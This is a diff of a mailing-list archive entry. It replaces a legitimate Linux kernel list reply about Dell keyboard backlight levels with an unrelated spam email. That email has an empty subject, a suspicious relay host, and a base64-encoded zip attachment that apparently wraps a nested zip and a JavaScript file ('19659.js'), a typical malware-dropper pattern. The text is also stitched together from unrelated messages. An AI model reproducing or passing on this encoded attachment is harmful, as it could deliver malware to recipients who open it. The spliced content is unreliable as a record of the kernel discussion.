@@ -1,32 +1,76 @@
-From: Pali =?utf-8?B?Um9ow6Fy?= <pali.rohar@gmail.com>
-Subject: Re: [PATCH v2] platform/x86: dell-laptop: Fix bogus keyboard
- backlight sysfs interface
-Date: Mon, 19 Jun 2017 10:47:43 +0200
-Message-ID: <20170619084743.GB32387@pali>
-References: <20170619073629.14239-1-kai.heng.feng@canonical.com>
- <20170619075742.GA32387@pali>
- <CAAd53p4H-4hhCo5iyYgSu9jL=jGqK2ztUtNMXnPYbpH8LySV7Q@mail.gmail.com>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Mon, 19 Jun 2017 09:36:17 -0000
+Message-ID: <149786497797.29697.12378441417497643606@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="608217586713206.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from mail-wm0-f45.google.com ([74.125.82.45]:35288 "EHLO
-        mail-wm0-f45.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750952AbdFSIrq (ORCPT
+Received: from ws166.zone31-163-166.zaural.ru ([31.163.166.166]:40976 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753506AbdFSJgW (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Mon, 19 Jun 2017 04:47:46 -0400
-Content-Disposition: inline
-In-Reply-To: <CAAd53p4H-4hhCo5iyYgSu9jL=jGqK2ztUtNMXnPYbpH8LySV7Q@mail.gmail.com>
+        Mon, 19 Jun 2017 05:36:22 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Kai-Heng Feng <kai.heng.feng@canonical.com>
-Cc: andy@infradead.org, Matthew Garrett <mjg59@srcf.ucam.org>, dvhart@infradead.org, platform-driver-x86@vger.kernel.org, LKML <linux-kernel@vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-On Monday 19 June 2017 16:39:14 Kai-Heng Feng wrote:
-> The same rule should also apply to kbd_info.levels, right?
-
-IIRC no. levels = 1 means you can set two levels (0 and 1). Look into code.
-
--- 
-Pali Rohár
-pali.rohar@gmail.com
+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
+DAAAAAA=
